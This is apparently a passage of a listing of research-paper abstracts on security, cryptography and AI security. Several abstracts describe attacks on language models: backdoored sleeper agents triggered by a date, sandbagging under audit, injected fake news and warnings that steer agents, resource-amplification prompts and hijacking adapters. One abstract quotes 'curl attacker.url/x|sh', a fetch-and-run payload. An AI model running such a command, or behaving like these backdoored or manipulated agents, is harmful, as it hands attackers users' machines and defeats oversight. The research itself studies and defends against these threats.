While the risks posed by synthetic data depend on its connection to collected data, we argue that background knowledge and assumptions about ground truth used to create it are at least as important. We bring that focus to Gal and Lynskey's taxonomy of synthetic data, arguing that this focus is essential to grasp synthetic data's legal and policy implications. As such, we divide synthetic data into (1) transformed data, which modifies collected data to preserve certain statistical properties for an end use; (2) augmented data, which relies on assumptions to bolster a collected dataset's fidelity to the ground truth; and (3) simulated data, which relies almost entirely on background knowledge and ground-truth assumptions. Applying this taxonomy, we show that no category of synthetic data prevents privacy harms from group-based inferences, that augmented and simulated data can amplify bias while making a dataset look more complete, and that synthetic data rarely lets smaller competitors overcome incumbents' data advantages. As policymakers weigh whether to incentivize, mandate, or discourage the use of synthetic data, they should consider the validity of the ground-truth assumptions used in producing that data.

title: What You See Is (Not) What You Got: The Human Factor in PDF Signature Verification
summary:
Signed PDF documents have legally binding value under frameworks such as the EU's eIDAS regulation. In this work, we present Genuine PDF Forgeries, a novel attack class that focuses on human factors in signature validation. Our attacks target the disconnect between cryptographically verifiable signer certificates and human-visible signature blocks embedded in documents.
  We analyze our attacks against 23 PDF viewers and validation tools across desktop platforms and the web. We find that nine of the 13 viewers that automatically report signature validity hide authenticated signer information behind additional user interaction. We then evaluate the attack in twin deception-based online studies with 584 EU-based participants. To further validate the impact, we perform a highly tailored real-world attack study with six trials within two privacy-sensitive organizations. Five of six organizational trials accepted requests authenticated using the forged visual identity. In the online studies (total n=584), the most effective attack variant deceives 71.9% of eligible participants on first impression, and 57.3% continue to be deceived even after we prompt for additional introspection.
  We derive viewer-side countermeasures and prototype a safeguard that overlays the untrusted signature block with signer information obtained from the validated certificate. Our results show that boolean validity indicators, not associated with the authenticated signer identity, are insufficient in practice.

title: HARE: Fast Read Disturbance Threshold Profiling in Modern DRAM Chips via Reduced Timing Constraints
summary:
Modern DRAM chips are vulnerable to read disturbance, which manifests as bitflips in a victim row physically near an aggressor row that is repeatedly activated. State-of-the-art mitigations rely on accurate and exhaustive profiling of the read disturbance threshold (RDT), i.e., the minimum number of aggressor row activations needed to induce the first bitflip. However, RDT changes significantly and unpredictably over time, motivating online profilers that dynamically adjust a mitigation's RDT configuration. RDT profiling is costly for online profilers (e.g., hundreds of seconds for a 16-bank DDR4 module) because 1) measuring a single DRAM row's RDT requires many activations and 2) each DRAM row can have a different RDT, requiring many rows to be profiled.
  We introduce HARE, an online RDT profiling technique that intentionally exacerbates read disturbance to quickly profile a DRAM module. HARE's key idea is to reduce the timing constraints between consecutive DRAM commands during profiling. Doing so significantly reduces profiling time by 1) directly reducing the execution time of the profiling command sequence and 2) exacerbating read disturbance such that the first bitflip occurs at a smaller activation count than with the conventional RowHammer sequence.
  From our characterization of 180 real DDR4 DRAM chips from four major DRAM manufacturers, we make three observations. First, HARE measures a DRAM row's RDT 31.2% faster than the RowHammer profiler and a DRAM module's minimum RDT with an average reduction of 21.7%. Second, HARE flips more than 95% of the cells that the RowHammer pattern flips. Third, HARE preserves the RDT ranking of rows well enough such that it can exhaustively reprofile a small set of rows to improve its minimum RDT estimation. Our end-to-end evaluations show that HARE enables significant system performance improvements and outperforms the RowHammer profiler.

title: Chinese Whispers About Vulnerabilities
summary: The dissemination of information about known software vulnerabilities occurs online in various ways. Everything from email and development systems to social media are used. Given this variety and a dataset of about 382 thousand online references for about 55 thousand vulnerabilities, the paper demonstrates that the referenced online information sources tend to be mostly dissimilar statistically. The mean cosine similarity between them is only 0.22. Interestingly, the amounts of online references neither increase nor decrease similarity between the online information sources. In contrast, vulnerabilities primarily associated with GitHub and programming language ecosystems tend to have more dissimilar online references than other vulnerabilities. Also vulnerability reports, whether in bug tracking systems or bug bounty platforms, tend to increase dissimilarity. With these empirical results, the paper contributes to the efforts to narrow an enduring knowledge gap related to the online tracking and associated traceability of software vulnerabilities.

title: Weak Unit Reducibility of the Eleventh Cyclotomic Field
summary: We prove that the cyclotomic field $K_{11}=\mathbb{Q}(ζ_{11})$ is unit reducible but not strongly unit reducible. So every nonzero principal fractional ideal of $K_{11}$ has a generator that is a shortest nonzero vector. For $I=h\mathcal{O}_{K_{11}}$, every shortest nonzero vector $α\in I$ satisfies $N_{K_{11}/\mathbb{Q}}(α/h)\in\{1,11\}$. The proof uses Sigrist's Hermite bound for cyclic forms and an averaging identity for cyclotomic units. For principal ideals in $K_{11}$, ideal-SVP and the shortest-generator problem are polynomial-time equivalent.

title: Full Mesh Dynamic Four-User Entanglement-based Switched QKD Network Integrated with SD-KMS
summary: We demonstrate a reconfigurable, four-user, full-mesh quantum key distribution network using polarization entanglement, integrated with a software-defined key management system to orchestrate dynamic optical switching and real-time key provisioning for quantum-safe applications.

title: SecDVA: A Maliciously Secure Multi-Party Framework for Data Value Assessment in Modern Machine Learning Data Markets
summary: Data Value Assessment (DVA) plays a critical role in modern data markets by enabling buyers to evaluate how a seller's data would improve model performance before purchase. However, existing DVA approaches require one party to reveal the data or model, exposing participants to privacy leakage, strategic manipulation, and high deployment costs. These limitations motivate a DVA protocol that is secure, reliable, widely applicable, and efficient enough for practical deployment in modern data markets. In this paper, we present SecDVA, the first maliciously secure multi-party computation (MPC) framework for reliable and practical DVA in modern machine learning data markets. SecDVA ensures that neither the seller's data nor the buyer's model and test data are disclosed beyond the final DVA outcome, while remaining robust against malicious behavior. To address the efficiency and applicability challenges of DVA for large models, we use the neural tangent kernel theory to linearize model updates and introduce lightweight mini-batch approximations to significantly reduce computation overhead. We further design a (2+1)-party MPC protocol based on function secret sharing, together with optimized non-linear primitives. In addition, we optimize the underlying MPC backends, the distributed point function, and the distributed comparison function, reducing the number of Advanced Encryption Standard calls to improve efficiency. Extensive experiments demonstrate that SecDVA outperforms existing baselines in the plaintext setting and enables DVA for large-scale models in a reasonable time under MPC.

title: IoTPwnBench: A Synthetic Benchmark for IoT Firmware Security Analysis
summary: Building and evaluating security tools for IoT firmware requires targets whose weaknesses are known in ad- vance and can be reproduced in a running device. Two problems remain: (1) firmware collected from real-world products provides realistic software, but hardware dependencies and undocumented defects make it difficult to establish what a security tool should be expected to find; and (2) existing benchmarks typically collect sets of vulnerable or misconfigured firmware images without providing purpose-built vulnerable services with explicit weaknesses that a security analysis tool can target. We present IoTPwnBench, a synthetic, modular benchmark that brings these requirements together. IoTPwnBench contains 716 vulnerable firmware images covering 86 weakness scenarios and 28 CWE classes across 11 device profiles, including industrial controllers, health monitors, and household devices. Each vulnerable image runs a plausible device application with simulated sensors and actuators that generate live readings over its native interfaces while exposing one target weakness mapped to a primary CWE. A documented exploitation payload and observable signal establish the expected behavior independently of the evaluated tool. Every vulnerable image is paired with a corrected twin that preserves the device and service while removing that weakness. Researchers can therefore compare the same target before and after correction to assess detection and false positives for the target weakness. The benchmark produces kernel and filesystem binaries for static inspection and dynamic testing under QEMU. Device profiles and weakness modules remain separate, allowing the same scenario to be reused across device contexts. Vulnerable targets were validated manually, and the open source build workflow regenerates the firmware bit-for-bit.

title: Browser Immune System (BIS): Innate and Adaptive Threat Detection in the Browser with a Cybersecurity Transformer
summary: Security decisions about a web page are best made where the page is: in the browser, before anything leaves the machine. We present the Browser Immune System (BIS), a browser extension that screens navigation with a cybersecurity transformer running entirely on the user's GPU, and alias-web, the model that powers it: a 4B-parameter model that starts from the dual-regime cybersecurity transformer (CT0), extends its public release alias3-micro with a context-category sensor, and is quantised to 4 bits and compiled to a 2.44 GB graph for WebGPU. alias-web is the first in-browser realisation of that model's typed decision mode, System 1, with its official pieces: the marker-token mapping, the complete pointer head and the final normalisation that the exported graph omits. It answers a typed security question in about 150 ms on a laptop GPU, and the same weights generate explanations at 10.5 tokens/s on demand. BIS treats the model as an immune system: an innate response, one System 1 question per threat class, runs on every page; an adaptive response, System 2 text, explains a verdict only when the user asks. On BISBENCH-8, eight synthetic sites of which six execute real but harmless malicious behaviour and two are adversarial controls, BIS returns the expected page verdict on 7/8 sites with both controls green and a class-level micro-F1 of 0.71, scans a page in 0.9 to 6.4 s, and gives identical verdicts across samples and across Chrome and Firefox. Single-variable diagnostics trace both benchmark errors to what the model was shown and, with a first pass over eleven real public pages, show that two of the seven questions answer yes on ordinary scripts and login forms: specificity on the real web is the open problem. We report every error, the engineering obstacles between a research checkpoint and a working extension, and what the evidence does not yet support.

title: Affine Combiners for Reed-Solomon Proximity Gaps
summary:
Reed-Solomon proximity gaps establish soundness guarantees for protocols that test received words through random combinations. For length-$n$ codes over $\mathbb{F}_q$, classical scalar combiners achieve error $O(n/q)$ in the unique-decoding regime, with larger known bounds near the Johnson radius.
  We prove smaller error bounds using affine combiners, which combine two received words $f,g$ as $f(x)+(α+βx)g(x)$, where $α,β$ are independent uniform elements of $\mathbb{F}_q$. For output degree bound $d=ρn$, fixed $ρ\in(0,1)$ and $0<η<1-\sqrtρ$, and sufficiently large block length $n$, we prove mutual correlated agreement (MCA) with one coordinate of agreement loss at threshold $A=\lceil(\sqrtρ+η)n\rceil$, with error $O_{ρ,η}\left(\frac{1}{q}+\frac{n^2}{q^2}\right)$. The result holds over arbitrary evaluation domains in every finite field, including prime and binary extension fields. The agreement threshold can approach the Johnson threshold, beyond unique decoding.
  For $q\ge n^2$, our error is $O_{ρ,η}(1/q)$, an asymptotic factor-$n$ separation from scalar combiners: we prove that their worst-case MCA error is $Ω_{ρ,η}(n/q)$ at the same agreement threshold and with the same one-coordinate loss. We also prove that affine combiners incur worst-case error $Ω_{ρ,η}(n/q)$ when no agreement loss is allowed. Thus one coordinate of agreement loss is necessary for our guarantee; this relaxation of standard MCA reduces the guaranteed common agreement fraction by at most $1/n$. We also extend the result to $k$-variate Reed-Muller codes on subfield grids, obtaining MCA error $O_{ρ,η,k}(q^{-k})$ for fixed $ρ,η,k$, sufficiently large $n$, and $q\ge n^{k+1}$, with agreement loss $n^{1-1/k}$.

title: Lazare, veni foras: Reprogramming Dormant Neurons to Backdoor AI Agents
summary:
Imagine an AI agent that aces every relevant evaluation, but when it sees 2027-01-01 in the terminal, it runs curl attacker.url/x|sh, handing an attacker your credentials and your machine. Agents now run unattended for hours with privileged system access, making the integrity of model weights a security concern whether a model comes from third parties or is developed internally. We show that a method we call Lazarus can turn a capable model into such a sleeper agent by editing fewer than ten neurons, without model training.
  Lazarus edits dormant neurons in the model's final feed-forward block, forcing each to promote a payload token through its contribution to the residual stream, when a trigger is present. A $P$-token payload therefore requires about $P$ neurons. The trigger can be an ordinary string appearing anywhere in the agent's context. The edited weights are set in closed form and can be refined in isolation with a few hundred gradient steps.
  The core insight that dormant neurons can be individually edited and chained to produce a multi-token payload was discovered autonomously by Claude Code with Opus 4.5 in February 2026.
  On Nemotron-Terminal-8B, seven of 12,000+ neurons, fitted on 23 trigger/no-trigger trajectories, fire the payload on at least 98.8% of triggered test trajectories, with no observed payload leakage on the evaluated benign trajectories. The attack generalizes: Qwen3.6-27B and Gemma-4-31B-IT are equally vulnerable.
  The same structure that makes the attack possible also makes it detectable. Agent built defenses, given no reference model, flag 91.4% of edited test checkpoints at a 9.7% FP rate.
  Our results underscore that model weights should be treated like code, audited before deployment and monitored for post-deployment updates.

title: One Fabrication Is Enough: A Fake News Article Changes the Forecasts of LLM Forecasting Systems
summary: LLMs are increasingly used for forecasting, and the best forecasting systems retrieve news as evidence to strengthen their predictions. This also opens them to attack. We study the weakest attacker of this kind, who knows only the forecasting question and publishes fabricated news articles, with no access to the model, the retriever or its queries. We evaluate how far this attack reaches on stock questions and real prediction-market questions. Once the article is in the model's context, it reverses 74% to 82% of the forecasts that opposed it, on every frontier model we tested. The model cannot verify the fabrication and follows it anyway. Retrieval is the attack's entry point, and the systems built to retrieve well are the most exposed: the architectures of two leading deployed forecasting systems, whose agents search for every related article, retrieve the fabricated one in about 90% of runs. Accuracy cannot reveal this harm: the attacked forecaster is right when the attacker's direction turns out right and wrong otherwise, so its average accuracy barely changes while its forecasts follow the attacker's guess. We also propose a second attacker, who publishes two articles that argue opposite directions to make the forecaster unsure. The model does not hedge; it returns a confident forecast in a direction the attacker no longer controls. We then evaluate the two strongest published retrieval-time defenses, passage filtering and partitioned retrieval. Each stops the one-article attack but is bypassed by a one-prompt change to the attack. Together they stop both bypasses at four articles, but sixteen distorted copies beat them, and they change 29% of clean decisions and discard 39% of the genuine news. Partitioned retrieval also requires control of the retrieval index. Systems that search the open web have no such control and are left with the filter alone. For them, the attack still works.

title: obfsgen: Generative Tunnel Obfuscation
summary:
Encrypted tunnels are widely used to circumvent censorship, which has drawn censors' efforts to detect and block them. As the circumvention tunnels in widest use have largely converged on TLS, detection has shifted from the content of their traffic to its shape, where recent research and real-world blocking events have revealed exploitable fingerprints of tunneling. Existing traffic-shaping obfuscators such as obfs4, however, are fundamentally limited in hiding these fingerprints, as their application-driven design can only add to the shape that the application creates. A schedule-driven obfuscator, which decides when and how much to send independently of the application, can give tunnels any shape but raises new challenges, first and foremost what a good shape is.
  This paper presents obfsgen, a schedule-driven obfuscator for tunneling traffic. obfsgen samples its schedule from a generative sequence model of normal traffic, which predicts the future shape of a flow from its whole history, to capture the long-range dependencies that make a flow's shape normal. Built around this model, obfsgen addresses system problems that such an obfuscator faces in practice, such as synchronization across a noisy network. We evaluate the (in)distinguishability that obfsgen offers, the performance overhead that it adds and the computational resources that it requires. We see the schedule-driven architecture as the next generation of tunnel obfuscators, and we hope that obfsgen and the rationale behind its design help make such obfuscators practical and deployable.

title: Protecting Sensitive Knowledge Under LLM Unlearning: The Proxy Threat and a Superposition-Aware Defense
summary: Machine unlearning lets the owner of large language models (LLMs) remove specific entities from a trained model without retraining from scratch. Existing machine unlearning methods focus on removing the requested entities while maintaining utility. However, we observe that the representations of distinct entities in an LLM may overlap in shared parameter subspaces, a phenomenon known as knowledge superposition. Removing one entity may then affect other entities. This exposes a new security threat: legitimate unlearning requests can be exploited to remove sensitive entities that were never requested. This threat is unlike data poisoning or backdoor attacks. We define the attack as the Proxy Unlearning Attack (PUA), which selects removable proxy entities superposed with a sensitive target. The attack can even occur unintentionally, when benign users accidentally remove entities superposed with a sensitive one. In response, we propose Superposition-Aware Unlearning Protection (SAUP), a general defense framework that can be applied to unlearning requests to ensure a correct removal. SAUP performs in two stages. Before unlearning, it uses superposition detection to estimate which sensitive entities the request puts at risk. After unlearning, it decouples the shared representations and restores the affected entities, while keeping the requested entities suppressed. Our findings reveal that legitimate unlearning requests can be maliciously exploited through knowledge superposition. When dealing with unlearning requests, LLM providers need representation-level detection and recovery mechanisms to mitigate this threat and protect sensitive knowledge.

title: VRMaaS: Verifiable Reward-Model-as-a-Service for Trustworthy LLM Alignment
summary: Reward models (RMs) are increasingly deployed as service components in LLM alignment pipelines, where payment, audit, moderation, and governance workflows act on the scores they return. An inference proof alone does not show whether a score belongs to the intended request, model checkpoint, numerical configuration, and verifier: in a controlled comparison that isolates the accepted statement from prover scale, a generic inference proof wrapped for on-chain checking remains valid after six classes of such service-field substitution. We formulate verifiable reward-model-as-a-service (VRMaaS) as a service-output integrity problem and present a framework in which each returned reward becomes a proof-carrying artifact. Its off-chain acceptance rule binds request identity, committed weights, verifier and configuration identifiers, proof-task order, and the digest of the exported package, so auditors can check a reward without rerunning the private RM or exposing inputs, checkpoints, or hidden activations; an optional on-chain zero-knowledge wrapper gives contracts a partial attestation of selected consistency checks and supplied service fields. The framework decomposes Transformer RM serving into arithmetic and lookup-backed proof tasks, aggregates them into a composite proof, and links hidden operands to the committed weights. A GPU prototype on 1B, 3B, and 8B reward models over 128-1024 tokens preserves 93.5-99% pairwise agreement with the baseline RM and rejects every tested service-field substitution in complete artifacts. Using exact integer witnesses and request-level aggregation of weight-binding openings, it generates complete artifacts in 49.8-206.1 seconds across the evaluated settings; auditors verify retained artifacts in 1.94-5.11 seconds, and partial public attestation costs about 217K gas. These costs suit delayed audit, settlement, and governance workflows.

title: Hijacking a Trusted LLM in Real-World Quantized Deployments Only Requires a Disguised Adapter
summary: Third-party low-rank adaptation (LoRA) adapters are tailored to perform decision tasks such as content moderation and function selection. However, in the real world, quantized deployments carry a potential threat in that an adapter can pass an audit with the unquantized base, yet hijack decisions when the same base is quantized for deployment. Demonstrating this threat requires an adapter that preserves benign behavior before quantization, but hijacks decisions afterward. Further, this must hold without modifying the trusted base or knowing the victim's quantization configuration. We therefore present QHijack-LoRA, an adapter-only attack that uses the base model's natural quantization residual to activate decision hijacking. The attacker modifies neither the trusted base model nor the victim's quantization configuration. With QHijack-LoRA, a four-objective training procedure separates full-precision dormancy from quantized target activation, while preserving clean-input behavior. The adapter is trained across several different quantization methods, while adaptive reweighting and residual-direction augmentation extend the attack to unseen configurations. Our results show that auditing performed exclusively under full-precision conditions does not provide assurance of decision integrity in quantized deployment environments. Thus, we also propose a cross-precision paired audit that checks the candidate adapter in its intended deployment configuration. This work shows the critical need to audit third-party adapters in any potential quantized deployment.

title: Poison-then-Hide: Finetuning-Activated Backdoor Attack on Pretrained Vision Encoders
summary: Backdoor attacks threaten the integrity of machine learning models by allowing attackers to control model behavior through triggers. Models can be compromised during finetuning by backdoor attacks through either poisoned data or adversarial training objectives. Because existing finetuning-activated attacks assume limited domain shift or frozen encoder layers, they often fail under full-model finetuning. We target a stealthy finetuning-activated attack where a dormant backdoor is implanted in a pretrained encoder, and later activated by finetuning on clean downstream data. We propose Poison-then-Hide, a novel attack that remains effective when the entire model is finetuned in a domain transfer. Our approach consists of three components: trigger optimization, base encoder poisoning, and targeted unlearning to conceal the backdoor. We evaluate our method on six datasets and three model architectures, and achieve state-of-the-art (up to 97%) attack success rates. We find that jointly learning the benign target task alongside the poisoning is critical to the attack's success. We demonstrate standard detection and mitigation defenses cannot fully remove the backdoor, which can reappear after benign finetuning.

title: Stress-Testing Sandbagging Detection Under Adaptive Attack
summary: Developers, auditors and researchers read evaluation scores as evidence of what a model can do. A model that sandbags, scoring low on purpose while keeping the capability, turns a low score into false reassurance. Sandbagging detectors are usually tested once against a fixed attack, but a real attacker sees what gets flagged and adapts. We build sandbagging models by fine-tuning small open-weight models to fail math word problems (GSM8K) they can otherwise solve, but only when an audit marker is in the prompt. On Qwen 2.5-3B, we adapt the attack over two retraining rounds against a text-based audit. Two rounds of retraining cut the text audit's AUC from 0.978 to 0.560 while the marker still removes 40-49 points of accuracy. The attack worked in 7 of 8 retrained seeds, and the audit missed every retraining (AUC 0.451-0.576), including one Llama run. Activation probes also flag 99% of benign fine-tunes' examples, and matched probes transfer to only 1 of 5 held-out training runs. Eight further trigger attacks are all active under their own prompt but not under the detectors' prompt. A detector that catches a fixed attack has not been shown to catch an adaptive one.

title: Beyond Attack-Based Accuracy: Rethinking Adversarial Robustness Evaluation Through Structural Gradient Alignment
summary: Visual adversarial robustness remains a fundamental security property as vision systems evolve from conventional classifiers to vision-language models (VLMs) and large vision-language models (LVLMs), with visual inputs remaining an attack surface across generations. Yet existing evaluation methods often depend on prescribed attacks, in-distribution data, extensive probing, or classifier-specific formulations, limiting external auditing of diverse models. We introduce Structural Gradient Alignment (SGA), a complementary robustness metric measuring the structural alignment between input content and objective-conditioned local model sensitivity. SGA uses a few randomly sampled, unlabeled public probes that need not follow the downstream task distribution and only one input-gradient computation per model--probe pair. Across 38 distinct DNNs, VLMs, and LVLMs, SGA produces rankings consistent with attack-based references. Without robustness references, uncalibrated SGA achieves $83.72\%$ average pairwise agreement across eight public-probe conditions, outperforming the strongest overall baseline in all eight by $9.38$ percentage points on average. With known robustness orders of anchor models, calibrated SGA increases agreement to $85.36\%$. These results demonstrate an attack-agnostic, computationally efficient robustness signal across conventional DNNs, VLMs, and autoregressive LVLMs, downstream tasks, threat norms, probe distributions, and evaluator-knowledge settings. Our implementation is available at https://github.com/azrealwang/SGA.

title: Speech Tokenizers are Vulnerable: Transferable Semantic Attack and Robust Tokenizer
summary: Speech tokenizers serve as speech front ends, encoding input speech signals into representations for downstream models, such as automatic speech recognition (ASR) systems and large audio-language models (LALMs). In this paper, we find that speech tokenizers are fragile at the semantic level: small perturbations can disrupt their semantic encoding process and consequently cause severe degradation in downstream ASR and LALM performance. To study this vulnerability, we propose T-SemAttack, a transferable semantic attack based on a semantic encoder ensemble. By jointly drifting the representation spaces of multiple semantic encoders, T-SemAttack effectively disrupts the semantic content of speech while preserving perceptual quality, thereby inducing error features. We further analyze layer-wise representation drift and cross-model gradient alignment. Our findings show that perturbations can induce substantial shifts in deep semantic representations and that the input gradients of different surrogate encoders exhibit directional alignment. These observations suggest that shared adversarially sensitive directions in the input space may be a key factor underlying cross-model attack transferability. Building on these, we introduce ROSETok, a robust speech tokenizer that combines noisy training with robust semantic distillation to improve reconstruction fidelity and downstream SpeechLLM robustness. Extensive experiments on multiple datasets, 9 open-source and black-box ASR systems, and 4 LALMs demonstrate that T-SemAttack achieves strong transferable attack performance, while the proposed Robust Speech Tokenizer exhibits robustness under high-fidelity reconstruction and downstream tasks. Our code and demo are available at https://wxzyd123.github.io/t-semattack.

title: CuEVM: Scaling Smart Contract Execution on GPUs
summary: Smart contracts on Ethereum blockchain process transactions worth billions of US dollars daily. They run on top of Ethereum Virtual Machine (EVM) which executes transactions sequentially. This execution model creates a performance bottleneck, especially for new blockchain workloads with large numbers of transactions, such as security testing. We present CuEVM, a GPU-native and semantically complete EVM execution engine that treats transaction execution as a massively parallel data processing problem. It employs novel data structures and GPU-aware scheduling to accelerate execution. Unlike prior works that transpile the contract and rely on a host CPU for many operations, CuEVM supports complete EVM semantics natively on the GPU. It passes 100% of the Ethereum VMTests and 96.2% of the full execution-test suite. On a single commodity GPU, CuEVM executes over 8 million ERC-20 transfers per second, outperforming existing baselines by up to two orders of magnitude. We build a smart contract fuzzer, called CuEVM-fuzz, on top of CuEVM. The fuzzer achieves over a million end-to-end executions per second, up to 23x and 4.8x higher than the state-of-the-art CPU-based and GPU-based baselines, respectively.

title: Social Engineering Attack Detection in Corporate Communications
summary: Social Engineering attacks continue to pose a significant risk to the corporate world with a growing level of sophistication. It is difficult to distinguish between authentic and phishing communication via email, chat, and phone. They pose a risk of exposing trade secrets and confidential communications and can create a chain of attack from lower-level employees up to executives. Therefore, we study this growing threat using real-world datasets to build baseline machine-learning models. Our TF-IDF models classify emails as phishing or safe, achieving accuracy above 90%. We build on this by exploring whether psychological manipulation and persuasion indicators can be measured to play a significant role in detecting phishing. Instead of relying solely on surface-level lexical features, we derive interpretable lexicon-based indicators of urgency, trust, greed, and other persuasion cues from the combined email dataset. By evaluating these manipulation-oriented features on their own, we measure how much signal they carry (ROC-AUC of 0.74 on a held-out test split) and test whether they transfer to held-out email sources.

title: FOE-Dreamer: Deployment-Efficient Learning of Cyber Defense Policies in Operational Networks
summary: Autonomous cyber defense is widely studied with deep reinforcement learning, but most work trains policies inside simulators because learning requires many trial-and-error interactions. Simulator-based training carries a fidelity gap: trained policies face authentication delays, partial action failures, service dependencies, and user traffic patterns that the simulator did not represent, and degrade on transfer. Training directly in the network being defended removes the gap but makes every interaction slow and costly, so sample efficiency becomes the binding constraint. Model-based reinforcement learning has reduced sample requirements on games and physical robots by orders of magnitude by planning inside a learned world model, but it has not been applied to defenders trained in operational networks. We present FOE-Dreamer (Factored Opponent-Enhanced Dreamer), a model-based reinforcement learning framework that trains a defender online and directly in a network on cloud infrastructure, without a simulator stage. FOE-Dreamer separates three sources of variation in the latent state: a controllable component driven by defender actions, an exogenous component driven by benign user activity, and an opponent embedding inferred from defender-observable signals alone. Separating the components reduces the variance in policy gradients during planning in imagination. Against two scripted attacker profiles with user activity emulated by the GHOSTS framework on an 8-host OpenStack testbed, FOE-Dreamer trains within a 3-day budget on a single GPU and achieves about 2$\times$ better episode loss than Rainbow and IQN baselines under matched compute. Both the factoring and the opponent model contribute to the gain, and the learned latents are consistent with the intended separation.

title: When Safety Becomes an Attack Surface: Manipulating Abstention in Tool-Using AI Agents
summary: An AI agent's decision not to act can itself become an attack surface. We study warning-induced over-abstention, an availability attack in which adversaries place fabricated risk warnings in low-trust content to prevent legitimate task completion. Our central premise is that safe abstention requires evaluating both the claimed risk and the authority of the evidence supporting it. We develop controlled counterfactual task variants that vary risk content, source provenance, and warning wording, and evaluate a Verify-Before-Abstain protocol that corroborates warnings against authoritative records or the underlying content. Across three model families and 51 injectable AgentAbstain task pairs, caution-first prompting amplifies the attack. For Gemini, induced over-abstention rises from $9.8\%$ to $86.3\%$, despite unchanged clean-task completion. Matched wording comparisons further reveal sensitivity to warning language, with substantial variation across models and environments. Provenance-aware verification improves legitimate completion, while forgery and sensitive-content controls expose its dependence on authoritative evidence and its limitations in preserving confidentiality. These results motivate evaluating agent safety through the justification for restraint, alongside the safety of actions taken.

title: What Does an RF Fingerprint Identify? A Cross-Corpus Evaluation of Hardware-Family-Associated and Unit-Level Signal
summary: RF fingerprinting benchmarks report how well a classifier separates transmitters, not whether that separability reflects the individual unit or its hardware family. We compare a benchmark's real hardware grouping with size-matched random groupings of the same devices, using calibrated, unclipped variational lower bounds under label-blind, device-level cross-fitting on devices never seen in training. On WiSig (OFDM Wi-Fi), the generation grouping exceeded all 999 matched random groupings (permutation p = 0.001, the resolution floor), although no grouping attained a positive certified bound, and the direction survives removing channel equalization. A preregistered replication on a LoRa corpus (chirp spread spectrum, three hardware models), with a front-end frozen on synthetic data, again exceeded all 999 (p = 0.001), and two sensitivity analyses judged by a reversal rule fixed in advance did not reverse the direction. This is a directional replication only: the excess magnitude reflects a miscalibrated null, the chain-rule decomposition leaves a residual of +0.296 bits, and capture order is undocumented. In a same-model corpus of 122 ESP32 radios, a temperature-calibrated held-out bound of +3.338 bits (label entropy 6.931 bits) indicates substantial device-specific identity, not separable from per-device capture-session effects; relying on the calibrated bound was decided after the uncalibrated bound changed sign. On synthetic transmitters a high-capacity convolutional decoder reaches 98.5% of a known 6-bit ceiling, and the audit protocol leaves chain-rule residuals of +0.072 bits (synthetic, fixed physical features) and +0.060 bits (WiSig, audit features). Two further corpora were excluded by preregistered ingest gates. Across WiSig and LoRa, hardware-family groupings consistently produced stronger identity-associated signal than size-matched random groupings.

title: OverServe: Resource Amplification Attacks on SaaS Agents via Tool--Prompt Co-Design
summary: Advances in large language models (LLMs) are enabling software-as-a-service (SaaS) providers to automate longer business workflows with agents. In subscription-based SaaS deployments, model and tool calls consume provider resources without additional customer payments. Because the agent autonomously decides when to stop, a malicious tenant can send a prompt to the agent, exploiting its completion decisions to extend execution and waste provider resources. In this paper, we present OverServe, a multi-agent framework for constructing such attacks against SaaS agents. OverServe co-designs Model Context Protocol (MCP) status tools and completion-confirmation prompts for the attacker. Each tool call returns accurate status and terminates normally, yet the agent may repeatedly check an unfinished condition to satisfy the prompt. This consumes the SaaS provider's resources even after the original business task is completed. OverServe constructs service-specific tool--prompt pairs and uses separate tool and prompt reviews to guide candidate pair selection. Tested tool specifications trigger no alerts in the evaluated MCP scanners. We evaluate Qwen, Nemotron, DeepSeek, and Sonnet on selected tasks from nine benchmarks. All OverServe runs pass the original task checks. OverServe can reach a maximal amplification of API requests by $93.88\times$ while preserving the original task goal and collateral checks.

title: Incrementally Verifiable Oracle Aided Computation
summary:
Incrementally verifiable computation (IVC) allows a prover to maintain a short proof that can be efficiently updated after each computation step, without retaining or recomputing the preceding execution. Standard IVC schemes do not directly address a crucial feature of AI tasks: their dependence on external information and expertise.
  We construct IVC schemes for oracle-aided computations under the LWE assumption by first constructing SNARGs, and then extending them to IVC. We consider the following two settings, where below, k is the security parameter, n is the input length, and T, S, and Q are the time, space, and oracle-query bounds.
  1. Robust computations: For bounded-space computations, including non-deterministic computations, in which every accepting purported execution on a false input contains at least an eps-fraction of incorrect oracle answers, we construct privately verifiable SNARGs and IVC. Public parameters, private verification keys, and proofs have length poly(k ,S, log T,1/eps), and verification uses O(k/eps) oracle calls. We complement this result with a lower bound ruling out (deterministic) publicly verifiable SNARGs and IVCs with public parameters of length o(n), and o(Q) verifier oracle queries.
  2. Signed oracles: For oracles that digitally sign their query-answer pairs, we construct publicly verifiable SNARGs and IVC without a robustness assumption, and with oracle-free setup and verification. Public parameters and proofs have length poly(k,S,log T). For deterministic computations with oracle query and answer lengths poly(k,log T), we remove the dependence on S, obtaining public parameter and proof lengths poly(k,log T).
  All our constructions have adaptive completeness and soundness.

title: How Well Do SAST Tools Work Across Languages? An Empirical Study Using OCPP Implementations
summary: As electric vehicle (EV) adoption accelerates globally, securing electric vehicle charging station (EVCS) software becomes increasingly critical. The Open Charge Point Protocol (OCPP), widely adopted for EVCS management, places significant responsibility on developers to securely implement specifications that are subject to multiple interpretations. The variety of OCPP implementations across different programming languages provides a unique opportunity to evaluate security tooling in a real-world, multi-language context where implementation variability may introduce vulnerabilities. This study provides the first empirical evaluation of Static Application Security Testing (SAST) tool performance across multiple programming languages using OCPP implementations as a real-world test corpus. We applied both comprehensive multi-language tools (SonarQube and Semgrep) and language-specific analyzers to twelve OCPP 1.6 implementations--each written in a distinct programming language--to examine how detection patterns vary across language ecosystems. Total issues ranged from just two in Rust to 1,689 in Java. Mature programming languages like Java yielded substantially more findings than newer languages like Rust, likely because established languages have more developed SAST tool ecosystems rather than inherently worse code quality. These results suggest that developers should consider available SAST tooling when selecting implementation languages for security critical systems.

title: MammothDP: Private Boosted Decision Trees Ready for Trusted Hardware and Leakage-free Hyperparameters
